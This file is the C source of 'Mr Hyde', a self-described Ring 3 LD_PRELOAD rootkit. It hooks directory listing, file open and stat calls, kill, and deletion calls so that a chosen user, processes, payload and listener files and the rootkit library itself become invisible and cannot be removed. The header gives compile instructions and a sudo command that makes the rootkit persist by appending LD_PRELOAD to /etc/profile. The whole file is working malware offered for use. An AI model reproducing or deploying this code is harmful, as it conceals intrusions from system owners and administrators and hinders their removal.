/**
 * @file mrhyde.c
 * @author Gris Iscomeback
 * @brief A Ring 3 Posix rootkit to hide users, processes, directories, and files.
 *
 * @details This posix rootkit intercepts various system calls to hide specific users,
 * processes, directories, and files. It is designed to be loaded using LD_PRELOAD.
 *
 * @tested_on Kernel: 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 * @name Mr Hyde
 * @rootkit_type Ring 3
 *
 * @compile gcc -fPIC -shared -o mrhyde.so -ldl mrhyde.c
 * @loadlsa mrhyde.so
 * @persist echo 'export LD_PRELOAD=/home/.grisun0/mrhyde.so' | sudo tee -a /etc/profile
 **/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dlfcn.h>
#include <pwd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/wait.h>
#include <wchar.h>
#include <locale.h>

#define HIDDEN_DIR "lazyown_atomic_test"
#define HIDDEN_FILE "mrhyde.so"
#define HIDDEN_FILE1 "payload.sh"
#define HIDDEN_FILE2 "{line}"
#define HIDDEN_FILE3 "l_{line}"
#define HIDDEN_FILE4 "{line}_service.sh"
#define HIDDEN_FILE5 "l_{line}_service.sh"
#define HIDDEN_FILE6 "monrev"
#define HIDDEN_FILE7 "{line}.service"
#define HIDDEN_FILE8 "listener_{line}.py"
#define HIDDEN_FILE9 "listener_{line}.sh"
#define PATHMRHYDE "mrhyde.so"

#define HIDE_DIR ".grisun0"
#define HIDE_USER "grisun0"
#define MAX_HIDE_PIDS 140
#define PID_FILE_PATH "/dev/shm/pid"
#define FILE_HIDE_PATH "/dev/shm/file"

typedef struct dirent original_dirent;
typedef struct dirent* (*original_readdir_t)(DIR*);
typedef int (*orig_unlink_f_type)(const char *pathname);
typedef int (*orig_kill_f_type)(pid_t pid, int sig);
typedef int (*orig_remove_f_type)(const char *);
typedef int (*orig_unlinkat_f_type)(int, const char *, int);

original_readdir_t original_readdir = NULL;

char *hide_pids[MAX_HIDE_PIDS] = {
    "1743", "2499", "3112", "1668", "1592", "1514", "2461",
    "1667", "1514", "1615", "1633", "1743", "2499", "2485"
};

char *hide_files[MAX_HIDE_PIDS] = {
    "nohup.out",
    "l_grisun0.service",
    "maleable_implant.png",
    "PLEASESUBSCRIBE"
};

void load_hidden_pids() {
    FILE *file = fopen(PID_FILE_PATH, "r");
    if (!file) {
        perror("Error opening PID file");
        return;
    }

    char buffer[256];
    int index = 14; 
    while (fgets(buffer, sizeof(buffer), file)) {
        char *pid = strtok(buffer, ",\"\n");
        while (pid && index < MAX_HIDE_PIDS) {
            hide_pids[index++] = strdup(pid);
            pid = strtok(NULL, ",\"\n");
        }
    }

    fclose(file);
}

void load_hidden_files() {
    FILE *file = fopen(FILE_HIDE_PATH, "r");
    if (!file) {
        perror("Error opening FILE hide file");
        return;
    }

    char buffer[256];
    int index = 4; 
    while (fgets(buffer, sizeof(buffer), file)) {
        char *filename = strtok(buffer, ",\"\n");
        while (filename && index < MAX_HIDE_PIDS) {
            hide_files[index++] = strdup(filename);
            filename = strtok(NULL, ",\"\n");
        }
    }

    fclose(file);
}

int unlink(const char *pathname) {
    static orig_unlink_f_type orig_unlink = NULL;
    if (!orig_unlink) {
        orig_unlink = (orig_unlink_f_type)dlsym(RTLD_NEXT, "unlink");
    }
    if (strcmp(pathname, PATHMRHYDE) == 0) {
        return -1;
    }

    return orig_unlink(pathname);
}

int kill(pid_t pid, int sig) {
    static orig_kill_f_type orig_kill = NULL;
    static pid_t my_pid = 0;
    load_hidden_pids();
    if (!orig_kill) {
        orig_kill = (orig_kill_f_type)dlsym(RTLD_NEXT, "kill");
        my_pid = getpid();
    }
    if (pid == my_pid) {
        return -1;
    }
    for (int i = 0; i < MAX_HIDE_PIDS && hide_pids[i] != NULL; i++) {
        if (hide_pids[i] && atoi(hide_pids[i]) == pid) {
            return -1;
        }
    }

    return orig_kill(pid, sig);
}

int remove(const char *pathname) {
    static orig_remove_f_type orig_remove = NULL;
    if (!orig_remove) {
        orig_remove = (orig_remove_f_type)dlsym(RTLD_NEXT, "remove");
    }
    if (strcmp(pathname, PATHMRHYDE) == 0) {
        return -1;
    }

    return orig_remove(pathname);
}

int unlinkat(int dirfd, const char *pathname, int flags) {
    static orig_unlinkat_f_type orig_unlinkat = NULL;
    if (!orig_unlinkat) {
        orig_unlinkat = (orig_unlinkat_f_type)dlsym(RTLD_NEXT, "unlinkat");
    }
    if (strcmp(pathname, PATHMRHYDE) == 0 ||
        strstr(pathname, HIDDEN_FILE) != NULL ||
        strstr(pathname, HIDDEN_FILE1) != NULL ||
        strstr(pathname, HIDDEN_FILE2) != NULL ||
        strstr(pathname, HIDDEN_FILE3) != NULL ||
        strstr(pathname, HIDDEN_FILE4) != NULL ||
        strstr(pathname, HIDDEN_FILE5) != NULL ||
        strstr(pathname, HIDDEN_FILE6) != NULL ||
        strstr(pathname, HIDDEN_FILE7) != NULL ||
        strstr(pathname, HIDDEN_FILE8) != NULL ||
        strstr(pathname, HIDDEN_FILE9) != NULL) {
        return -1;
    }
    return orig_unlinkat(dirfd, pathname, flags);
}

char* get_username_from_pid(pid_t pid) {
    char path[30];
    struct stat sb;
    uid_t uid;
    struct passwd *pw;

    snprintf(path, sizeof(path), "/proc/%d", pid);
    if (stat(path, &sb) == -1) {
        return NULL;
    }

    uid = sb.st_uid;
    pw = getpwuid(uid);
    if (pw) {
        return pw->pw_name;
    }
    return NULL;
}

int should_hide_pid(const char* pid) {
    pid_t pid_num = atoi(pid);
    char* username = get_username_from_pid(pid_num);
    load_hidden_pids();
    if (username && strcmp(username, HIDE_USER) == 0) {
        return 1;
    }
    for (int i = 0; i < MAX_HIDE_PIDS && hide_pids[i] != NULL; i++) {
        if (hide_pids[i] && strcmp(hide_pids[i], pid) == 0) {
            return 1;
        }
    }
    return 0;
}

int should_hide_file(const char* filename) {
    load_hidden_files();
    for (int i = 0; i < MAX_HIDE_PIDS && hide_files[i] != NULL; i++) {
        if (hide_files[i] && strcmp(hide_files[i], filename) == 0) {
            return 1;
        }
    }
    return 0;
}

struct dirent* readdir(DIR* dirp) {
    if (original_readdir == NULL) {
        original_readdir = (original_readdir_t)dlsym(RTLD_NEXT, "readdir");
        if (original_readdir == NULL) {
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());
            return NULL;
        }
    }

    load_hidden_pids();
    load_hidden_files();

    struct dirent* entry;
    while ((entry = original_readdir(dirp)) != NULL) {
        int needsToReturn = 0;
        if (strcmp(entry->d_name, HIDDEN_DIR) == 0) {
            needsToReturn = 1;
        }
        if (strcmp(entry->d_name, HIDE_DIR) == 0) {
            needsToReturn = 1;
        }
        if (
            strcmp(entry->d_name, HIDDEN_FILE) == 0 ||
            strcmp(entry->d_name, HIDDEN_FILE1) == 0 ||
            strcmp(entry->d_name, HIDDEN_FILE2) == 0 ||
            strcmp(entry->d_name, HIDDEN_FILE3) == 0 ||
            strcmp(entry->d_name, HIDDEN_FILE4) == 0 ||
            strcmp(entry->d_name, HIDDEN_FILE5) == 0 ||
            strcmp(entry->d_name, HIDDEN_FILE6) == 0 ||
            strcmp(entry->d_name, HIDDEN_FILE7) == 0 ||
            strcmp(entry->d_name, HIDDEN_FILE8) == 0 ||
            strcmp(entry->d_name, HIDDEN_FILE9) == 0 ) {
            needsToReturn = 1;
        }

        if (should_hide_pid(entry->d_name)) {
            needsToReturn = 1;
        }

        if (should_hide_file(entry->d_name)) {
            needsToReturn = 1;
        }

        int i;
        for (i = 0; i < MAX_HIDE_PIDS && hide_pids[i] != NULL; i++) {
            if (hide_pids[i] && strcmp(entry->d_name, hide_pids[i]) == 0) {
                needsToReturn = 1;
                break;
            }
        }

        if (needsToReturn) {
            continue;
        }

        return entry;
    }
    return NULL;
}

FILE *(*orig_fopen)(const char *pathname, const char *mode);
FILE *fopen(const char *pathname, const char *mode)
{
    if (!orig_fopen)
        orig_fopen = dlsym(RTLD_NEXT, "fopen");

    int needsToReturn = 0;

    if (strstr(pathname, HIDDEN_FILE) != NULL ||
        strstr(pathname, HIDDEN_FILE1) != NULL ||
        strstr(pathname, HIDDEN_FILE2) != NULL ||
        strstr(pathname, HIDDEN_FILE3) != NULL ||
        strstr(pathname, HIDDEN_FILE4) != NULL ||
        strstr(pathname, HIDDEN_FILE5) != NULL ||
        strstr(pathname, HIDDEN_FILE6) != NULL ||
        strstr(pathname, HIDDEN_FILE7) != NULL ||
        strstr(pathname, HIDDEN_FILE8) != NULL ||
        strstr(pathname, HIDDEN_FILE9) != NULL) {
        needsToReturn = 1;
    }

    int i;
    for (i = 0; i < MAX_HIDE_PIDS && hide_pids[i] != NULL; i++) {
        if (hide_pids[i] && strstr(pathname, hide_pids[i]) != NULL) {
            needsToReturn = 1;
            break;
        }
    }

    for (i = 0; i < MAX_HIDE_PIDS && hide_files[i] != NULL; i++) {
        if (hide_files[i] && strstr(pathname, hide_files[i]) != NULL) {
            needsToReturn = 1;
            break;
        }
    }

    if (needsToReturn) {
        errno = ENOENT;
        return NULL;
    }

    return orig_fopen(pathname, mode);
}

int (*orig_open)(const char *pathname, int flags, mode_t mode);
int my_open(const char *pathname, int flags, mode_t mode)
{
    if (!orig_open)
        orig_open = dlsym(RTLD_NEXT, "open");

    int needsToReturn = 0;

    if (strstr(pathname, HIDDEN_FILE) != NULL ||
        strstr(pathname, HIDDEN_FILE1) != NULL ||
        strstr(pathname, HIDDEN_FILE2) != NULL ||
        strstr(pathname, HIDDEN_FILE3) != NULL ||
        strstr(pathname, HIDDEN_FILE4) != NULL ||
        strstr(pathname, HIDDEN_FILE5) != NULL ||
        strstr(pathname, HIDDEN_FILE6) != NULL ||
        strstr(pathname, HIDDEN_FILE7) != NULL ||
        strstr(pathname, HIDDEN_FILE8) != NULL ||
        strstr(pathname, HIDDEN_FILE9) != NULL) {
        needsToReturn = 1;
    }

    int i;
    for (i = 0; i < MAX_HIDE_PIDS && hide_pids[i] != NULL; i++) {
        if (hide_pids[i] && strstr(pathname, hide_pids[i]) != NULL) {
            needsToReturn = 1;
            break;
        }
    }

    for (i = 0; i < MAX_HIDE_PIDS && hide_files[i] != NULL; i++) {
        if (hide_files[i] && strstr(pathname, hide_files[i]) != NULL) {
            needsToReturn = 1;
            break;
        }
    }

    if (needsToReturn) {
        errno = ENOENT;
        return -1;
    }

    return orig_open(pathname, flags, mode);
}

int (*orig_openat)(int dirfd, const char *pathname, int flags, mode_t mode);
int my_openat(int dirfd, const char *pathname, int flags, mode_t mode)
{
    if (!orig_openat)
        orig_openat = dlsym(RTLD_NEXT, "openat");

    int needsToReturn = 0;

    if (strstr(pathname, HIDDEN_FILE) != NULL ||
        strstr(pathname, HIDDEN_FILE1) != NULL ||
        strstr(pathname, HIDDEN_FILE2) != NULL ||
        strstr(pathname, HIDDEN_FILE3) != NULL ||
        strstr(pathname, HIDDEN_FILE4) != NULL ||
        strstr(pathname, HIDDEN_FILE5) != NULL ||
        strstr(pathname, HIDDEN_FILE6) != NULL ||
        strstr(pathname, HIDDEN_FILE7) != NULL ||
        strstr(pathname, HIDDEN_FILE8) != NULL ||
        strstr(pathname, HIDDEN_FILE9) != NULL) {
        needsToReturn = 1;
    }

    int i;
    for (i = 0; i < MAX_HIDE_PIDS && hide_pids[i] != NULL; i++) {
        if (hide_pids[i] && strstr(pathname, hide_pids[i]) != NULL) {
            needsToReturn = 1;
            break;
        }
    }

    for (i = 0; i < MAX_HIDE_PIDS && hide_files[i] != NULL; i++) {
        if (hide_files[i] && strstr(pathname, hide_files[i]) != NULL) {
            needsToReturn = 1;
            break;
        }
    }

    if (needsToReturn) {
        errno = ENOENT;
        return -1;
    }

    return orig_openat(dirfd, pathname, flags, mode);
}

int (*orig_stat)(const char *pathname, struct stat *statbuf);
int stat(const char *pathname, struct stat *statbuf)
{
    if (!orig_stat)
        orig_stat = dlsym(RTLD_NEXT, "stat");

    int needsToReturn = 0;

    if (strstr(pathname, HIDDEN_FILE) != NULL ||
        strstr(pathname, HIDDEN_FILE1) != NULL ||
        strstr(pathname, HIDDEN_FILE2) != NULL ||
        strstr(pathname, HIDDEN_FILE3) != NULL ||
        strstr(pathname, HIDDEN_FILE4) != NULL ||
        strstr(pathname, HIDDEN_FILE5) != NULL ||
        strstr(pathname, HIDDEN_FILE6) != NULL ||
        strstr(pathname, HIDDEN_FILE7) != NULL ||
        strstr(pathname, HIDDEN_FILE8) != NULL ||
        strstr(pathname, HIDDEN_FILE9) != NULL) {
        needsToReturn = 1;
    }

    int i;
    for (i = 0; i < MAX_HIDE_PIDS && hide_pids[i] != NULL; i++) {
        if (hide_pids[i] && strstr(pathname, hide_pids[i]) != NULL) {
            needsToReturn = 1;
            break;
        }
    }

    for (i = 0; i < MAX_HIDE_PIDS && hide_files[i] != NULL; i++) {
        if (hide_files[i] && strstr(pathname, hide_files[i]) != NULL) {
            needsToReturn = 1;
            break;
        }
    }

    if (needsToReturn) {
        errno = ENOENT;
        return -1;
    }

    return orig_stat(pathname, statbuf);
}

int (*orig_lstat)(const char *pathname, struct stat *statbuf);
int lstat(const char *pathname, struct stat *statbuf)
{
    if (!orig_lstat)
        orig_lstat = dlsym(RTLD_NEXT, "lstat");

    int needsToReturn = 0;

    if (strstr(pathname, HIDDEN_FILE) != NULL ||
        strstr(pathname, HIDDEN_FILE1) != NULL ||
        strstr(pathname, HIDDEN_FILE2) != NULL ||
        strstr(pathname, HIDDEN_FILE3) != NULL ||
        strstr(pathname, HIDDEN_FILE4) != NULL ||
        strstr(pathname, HIDDEN_FILE5) != NULL ||
        strstr(pathname, HIDDEN_FILE6) != NULL ||
        strstr(pathname, HIDDEN_FILE7) != NULL ||
        strstr(pathname, HIDDEN_FILE8) != NULL ||
        strstr(pathname, HIDDEN_FILE9) != NULL) {
        needsToReturn = 1;
    }

    int i;
    for (i = 0; i < MAX_HIDE_PIDS && hide_pids[i] != NULL; i++) {
        if (hide_pids[i] && strstr(pathname, hide_pids[i]) != NULL) {
            needsToReturn = 1;
            break;
        }
    }

    for (i = 0; i < MAX_HIDE_PIDS && hide_files[i] != NULL; i++) {
        if (hide_files[i] && strstr(pathname, hide_files[i]) != NULL) {
            needsToReturn = 1;
            break;
        }
    }

    if (needsToReturn) {
        errno = ENOENT;
        return -1;
    }

    return orig_lstat(pathname, statbuf);
}

int (*orig_fstat)(int fd, struct stat *statbuf);
int fstat(int fd, struct stat *statbuf)
{
    if (!orig_fstat)
        orig_fstat = dlsym(RTLD_NEXT, "fstat");

    int needsToReturn = 0;

    char path[1024];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    if (strstr(path, HIDDEN_FILE) != NULL ||
        strstr(path, HIDDEN_FILE1) != NULL ||
        strstr(path, HIDDEN_FILE2) != NULL ||
        strstr(path, HIDDEN_FILE3) != NULL ||
        strstr(path, HIDDEN_FILE4) != NULL ||
        strstr(path, HIDDEN_FILE5) != NULL ||
        strstr(path, HIDDEN_FILE6) != NULL ||
        strstr(path, HIDDEN_FILE7) != NULL ||
        strstr(path, HIDDEN_FILE8) != NULL ||
        strstr(path, HIDDEN_FILE9) != NULL) {
        needsToReturn = 1;
    }

    int i;
    for (i = 0; i < MAX_HIDE_PIDS && hide_pids[i] != NULL; i++) {
        if (hide_pids[i] && strstr(path, hide_pids[i]) != NULL) {
            needsToReturn = 1;
            break;
        }
    }

    for (i = 0; i < MAX_HIDE_PIDS && hide_files[i] != NULL; i++) {
        if (hide_files[i] && strstr(path, hide_files[i]) != NULL) {
            needsToReturn = 1;
            break;
        }
    }

    if (needsToReturn) {
        errno = ENOENT;
        return -1;
    }

    return orig_fstat(fd, statbuf);
}

struct linux_dirent64 {
    int64_t        d_ino;
    off_t        d_off;
    unsigned short d_reclen;
    unsigned char  d_type;
    char           d_name[];
};

int (*orig_getdents)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
int getdents(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
    if (!orig_getdents)
        orig_getdents = dlsym(RTLD_NEXT, "getdents");

    int nread = orig_getdents(fd, dirp, count);
    if (nread == -1) {
        return -1;
    }

    struct linux_dirent64 *dir;
    unsigned long offset = 0;
    while (offset < nread) {
        dir = (void *)dirp + offset;

        int needsToReturn = 0;

        if (strcmp(dir->d_name, HIDDEN_DIR) == 0 ||
            strcmp(dir->d_name, HIDE_DIR) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE1) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE2) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE3) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE4) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE5) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE6) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE7) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE8) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE9) == 0) {
            needsToReturn = 1;
        }

        if (should_hide_pid(dir->d_name)) {
            needsToReturn = 1;
        }

        if (should_hide_file(dir->d_name)) {
            needsToReturn = 1;
        }

        int i;
        for (i = 0; i < MAX_HIDE_PIDS && hide_pids[i] != NULL; i++) {
            if (hide_pids[i] && strcmp(dir->d_name, hide_pids[i]) == 0) {
                needsToReturn = 1;
                break;
            }
        }

        if (needsToReturn) {
            memmove(dirp + offset, dirp + offset + dir->d_reclen, nread - (offset + dir->d_reclen));
            nread -= dir->d_reclen;
            continue;
        }

        offset += dir->d_reclen;
    }

    return nread;
}

int (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
    if (!orig_getdents64)
        orig_getdents64 = dlsym(RTLD_NEXT, "getdents64");

    int nread = orig_getdents64(fd, dirp, count);
    if (nread == -1) {
        return -1;
    }

    struct linux_dirent64 *dir;
    unsigned long offset = 0;
    while (offset < nread) {
        dir = (void *)dirp + offset;

        int needsToReturn = 0;

        if (strcmp(dir->d_name, HIDDEN_DIR) == 0 ||
            strcmp(dir->d_name, HIDE_DIR) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE1) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE2) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE3) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE4) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE5) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE6) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE7) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE8) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE9) == 0) {
            needsToReturn = 1;
        }

        if (should_hide_pid(dir->d_name)) {
            needsToReturn = 1;
        }

        if (should_hide_file(dir->d_name)) {
            needsToReturn = 1;
        }

        int i;
        for (i = 0; i < MAX_HIDE_PIDS && hide_pids[i] != NULL; i++) {
            if (hide_pids[i] && strcmp(dir->d_name, hide_pids[i]) == 0) {
                needsToReturn = 1;
                break;
            }
        }

        if (needsToReturn) {
            memmove(dirp + offset, dirp + offset + dir->d_reclen, nread - (offset + dir->d_reclen));
            nread -= dir->d_reclen;
            continue;
        }

        offset += dir->d_reclen;
    }

    return nread;
}

int main() {
    DIR* proc = opendir("/proc");
    if (proc == NULL) {
        perror("opendir");
        return 1;
    }

    struct dirent* entry;
    while ((entry = readdir(proc)) != NULL) {
        if (entry->d_type == DT_DIR) {
            char* end;
            long pid = strtol(entry->d_name, &end, 10);
            if (*end == '\0' && pid != 0) {
                char* username = get_username_from_pid(pid);
                if (username) {
                    printf("PID: %ld, Username: %s\n", pid, username);
                }
            }
        }
    }

    closedir(proc);
    return 0;
}
